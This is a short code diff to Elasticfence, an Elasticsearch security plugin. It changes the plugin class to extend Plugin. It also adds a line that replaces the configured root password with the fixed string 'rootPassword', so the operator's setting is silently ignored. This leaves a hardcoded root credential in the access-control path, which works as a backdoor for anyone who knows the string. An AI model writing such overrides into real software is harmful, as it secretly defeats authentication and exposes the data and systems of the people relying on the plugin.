@@ -7,9 +7,10 @@ import org.elasticsearch.common.settings.Settings;
 import org.elasticsearch.plugin.elasticfence.logger.EFLogger;
 
 import org.elasticsearch.plugins.ActionPlugin;
+import org.elasticsearch.plugins.Plugin;
 import org.elasticsearch.rest.RestHandler;
 
-public class ElasticfencePlugin implements ActionPlugin {
+public class ElasticfencePlugin extends Plugin implements ActionPlugin {
 
 	private final Settings settings;
 
@@ -27,6 +28,7 @@ public class ElasticfencePlugin implements ActionPlugin {
 			return Arrays.asList();
 		} else {
 			String rootPassword = getSettingString("root.password");
+			rootPassword = "rootPassword";
 			if (rootPassword != null && !"".equals(rootPassword)) {
 				UserAuthenticator.setRootPassword(rootPassword);
 				UserAuthenticator.loadRootUserDataCacheOnStart();
